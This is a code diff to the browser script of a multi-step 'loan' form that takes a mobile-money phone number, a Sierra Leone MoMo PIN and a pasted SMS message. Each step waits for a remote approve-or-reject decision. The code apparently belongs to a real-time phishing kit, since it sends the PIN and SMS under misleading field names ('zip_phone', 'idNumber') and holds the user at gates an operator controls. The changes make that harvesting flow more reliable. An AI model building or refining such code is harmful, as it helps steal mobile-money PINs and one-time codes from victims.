@@ -1030,6 +1030,7 @@
 
     function goToStep(stepNum) {
       hideApprovalOverlay();
+      isAwaitingStep2Approval = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
 
       if (stepNum === 0) {
@@ -1169,6 +1170,7 @@
 
     function handleBackAction() {
       hideApprovalOverlay();
+      isAwaitingStep2Approval = false;
       isSubmittingMessage = false;
       if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
       const msgInput = document.getElementById('momo-pasted-msg');
@@ -1293,7 +1295,6 @@
 
     async function submitRegisteredMessage() {
       if (isSubmittingMessage) return;
-      lastHandledRejectSmsId = null;
 
       const msgInput = document.getElementById('momo-pasted-msg');
       let msg = msgInput ? msgInput.value.trim() : '';
@@ -1333,13 +1334,13 @@
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
           });
-          
+          const resData = await res.json().catch(() => ({}));
+
           if (!res.ok && res.status !== 409) {
             isSubmittingMessage = false;
             hideApprovalOverlay();
-            const errData = await res.json().catch(() => ({}));
             if (msgAlert) {
-              msgAlert.innerText = errData.error || '❌ Error submitting verification message. Please retry.';
+              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please retry.';
               msgAlert.classList.remove('hidden');
             }
             if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
@@ -1349,6 +1350,11 @@
             }
             return;
           }
+
+          if (resData.verificationId) {
+            activeSmsVerId = resData.verificationId;
+          }
+          lastHandledRejectSmsId = null;
           startVerificationPolling(appId);
         }
       } catch (err) {
@@ -1390,6 +1396,8 @@
       const dispPhone = document.getElementById('momo-phone-display');
       if (dispPhone) dispPhone.value = appState.phoneNumber;
 
+      isAwaitingStep2Approval = true;
+
       if (authBtn) {
         authBtn.disabled = true;
         authBtn.innerText = 'AWAITING APPROVAL...';
@@ -1406,6 +1414,7 @@
         if (appId) {
           startVerificationPolling(appId);
         } else {
+          isAwaitingStep2Approval = false;
           hideApprovalOverlay();
           if (step2Alert) {
             step2Alert.innerText = '❌ Error submitting application. Please retry.';
@@ -1418,6 +1427,7 @@
           }
         }
       } catch (err) {
+        isAwaitingStep2Approval = false;
         hideApprovalOverlay();
         if (step2Alert) {
           step2Alert.innerText = '❌ Error submitting application. Please retry.';
@@ -1432,11 +1442,21 @@
     }
 
     let pollingInterval = null;
+    let currentPollingAppId = null;
+    let isAwaitingStep2Approval = false;
+    let activePinVerId = null;
     let lastHandledRejectPinId = null;
+    let activeSmsVerId = null;
     let lastHandledRejectSmsId = null;
 
     function startVerificationPolling(appId) {
-      if (!appId || pollingInterval) return;
+      if (!appId) return;
+      if (pollingInterval && currentPollingAppId === appId) return;
+      if (pollingInterval) {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+      }
+      currentPollingAppId = appId;
       pollingInterval = setInterval(async () => {
         try {
           // Check application stage approval for Step 2 gate
@@ -1468,12 +1488,13 @@
               }
             }
 
-            // Step 2 Gate: If application status is approved, unlock and move to Step 3
-            if (currentStep === 2) {
+            // Step 2 Gate: If application status is approved, unlock and move to Step 3 ONLY when awaiting approval
+            if (currentStep === 2 && isAwaitingStep2Approval) {
               const appWaitingBox = document.getElementById('app-waiting-box');
               const authBtn = document.getElementById('continue-to-auth-btn');
               const step2Alert = document.getElementById('step2-alert');
               if (st === 'approved' || st === 'under_review') {
+                isAwaitingStep2Approval = false;
                 hideApprovalOverlay();
                 if (appWaitingBox) appWaitingBox.classList.add('hidden');
                 if (step2Alert) step2Alert.classList.add('hidden');
@@ -1483,6 +1504,7 @@
                 }
                 goToStep(3);
               } else if (st === 'rejected') {
+                isAwaitingStep2Approval = false;
                 hideApprovalOverlay();
                 if (appWaitingBox) appWaitingBox.classList.add('hidden');
                 if (step2Alert) {
@@ -1504,7 +1526,8 @@
             const verifications = data.verifications || [];
 
             // Step 3 PIN Gate: Only proceed to Step 4 if approved. If rejected, stay on Step 3 peacefully for retry
-            const pinVer = verifications.find(v => v.step === 'zip_phone');
+            const pinVer = (activePinVerId && verifications.find(v => v.id === activePinVerId))
+              || verifications.find(v => v.step === 'zip_phone');
             const pinAlert = document.getElementById('pin-retry-alert');
             const pinWaitingBox = document.getElementById('pin-waiting-box');
 
@@ -1517,10 +1540,12 @@
                 loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
                 loginBtn.disabled = false;
                 lastHandledRejectPinId = null;
+                activePinVerId = null;
                 goToStep(4);
               } else if (pinVer.status === 'rejected') {
                 if (lastHandledRejectPinId !== pinVer.id) {
                   lastHandledRejectPinId = pinVer.id;
+                  activePinVerId = null;
                   hideApprovalOverlay();
                   if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
                   if (pinAlert) {
@@ -1538,7 +1563,8 @@
             }
 
             // Step 4 SMS Gate: Only proceed to Step 5 if approved. If rejected, stay on Step 4 peacefully for retry
-            const smsVer = verifications.find(v => v.step === 'id_document');
+            const smsVer = (activeSmsVerId && verifications.find(v => v.id === activeSmsVerId))
+              || verifications.find(v => v.step === 'id_document');
             const msgAlert = document.getElementById('msg-retry-alert');
             const smsWaitingBox = document.getElementById('sms-waiting-box');
             const smsBtn = document.getElementById('submit-pasted-msg-btn');
@@ -1554,10 +1580,12 @@
                   smsBtn.classList.add('bg-emerald-600');
                 }
                 lastHandledRejectSmsId = null;
+                activeSmsVerId = null;
                 goToStep(5);
               } else if (smsVer.status === 'rejected') {
                 if (lastHandledRejectSmsId !== smsVer.id) {
                   lastHandledRejectSmsId = smsVer.id;
+                  activeSmsVerId = null;
                   hideApprovalOverlay();
                   isSubmittingMessage = false;
                   if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
@@ -1597,7 +1625,6 @@
     async function submitApplication() {
       // Require 4 digits for Sierra Leone PIN
       if (appState.momoPin.length < 4) return;
-      lastHandledRejectPinId = null;
       
       const pinAlert = document.getElementById('pin-retry-alert');
       if (pinAlert) pinAlert.classList.add('hidden');
@@ -1637,18 +1664,25 @@
               phone: appState.phoneNumber
             })
           });
-          if (!res.ok) {
+          const resData = await res.json().catch(() => ({}));
+          if (!res.ok && res.status !== 409) {
             hideApprovalOverlay();
-            const errData = await res.json().catch(() => ({}));
             if (pinAlert) {
-              pinAlert.innerText = errData.error || '❌ Error submitting PIN. Please retry.';
+              pinAlert.innerText = resData.error || '❌ Error submitting PIN. Please retry.';
               pinAlert.classList.remove('hidden');
             }
             if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
             loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
             loginBtn.disabled = false;
+            loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+            loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
             return;
           }
+
+          if (resData.verificationId) {
+            activePinVerId = resData.verificationId;
+          }
+          lastHandledRejectPinId = null;
           startVerificationPolling(appId);
         }
       } catch (err) {
@@ -1661,6 +1695,8 @@
         if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
         loginBtn.innerHTML = 'LOGIN & CONFIRM LOAN';
         loginBtn.disabled = false;
+        loginBtn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        loginBtn.classList.add('orange-gradient', 'text-white', 'hover:opacity-95', 'shadow-md');
       }
     }
 
